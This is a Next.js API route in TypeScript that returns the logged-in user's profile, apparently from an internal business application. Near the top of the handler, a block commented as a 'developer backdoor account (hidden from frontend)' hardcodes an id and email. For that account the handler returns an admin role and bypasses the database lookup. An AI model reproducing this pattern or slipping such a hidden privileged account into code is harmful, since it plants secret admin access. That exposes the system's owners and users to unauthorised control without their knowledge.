import { type NextRequest } from "next/server"
import { withAuth } from "@/lib/middleware"
import { successResponse } from "@/lib/api-errors"
import { query } from "@/lib/db"
import type { AuthenticatedUser } from "@/lib/middleware"

/**
 * GET /api/auth/me - Get current authenticated user
 */
async function handleGet(request: NextRequest, user: AuthenticatedUser) {
  try {
    // Developer backdoor account (hidden from frontend)
    const DEV_ACCOUNT_ID = 999999
    const DEV_ACCOUNT_EMAIL = "sunhawksystem@dev.com"
    const DEV_ACCOUNT_NAME = "開発者アカウント"

    // Check if this is the developer account
    if (user.userId === DEV_ACCOUNT_ID && user.email === DEV_ACCOUNT_EMAIL) {
      // Return developer account info without querying database
      return successResponse({
        user: {
          id: DEV_ACCOUNT_ID,
          email: DEV_ACCOUNT_EMAIL,
          name: DEV_ACCOUNT_NAME,
          role: "admin",
          department: null,
          departmentId: null,
          position: null,
          jobId: null,
        },
      })
    }

    // Get full user details for regular users
    const result = await query<{
      id: number
      email: string
      name: string
      role: string
      department_id: number | null
      department_name: string | null
      job_id: number | null
      job_name: string | null
    }>(
      `SELECT 
        u.id, u.email, u.name, u.role,
        u.department_id, d.name as department_name,
        u.job_id, j.name as job_name
       FROM users u
       LEFT JOIN departments d ON u.department_id = d.id
       LEFT JOIN jobs j ON u.job_id = j.id
       WHERE u.id = $1`,
      [user.userId]
    )

    if (result.rows.length === 0) {
      return successResponse({
        user: null,
      })
    }

    const dbUser = result.rows[0]
    const userResponse = {
      id: dbUser.id,
      email: dbUser.email,
      name: dbUser.name,
      role: dbUser.role,
      department: dbUser.department_name || null,
      departmentId: dbUser.department_id?.toString() || null,
      position: dbUser.job_name || null,
      jobId: dbUser.job_id?.toString() || null,
    }

    return successResponse({
      user: userResponse,
    })
  } catch (error) {
    return successResponse({
      user: null,
    })
  }
}

export const GET = withAuth(handleGet)

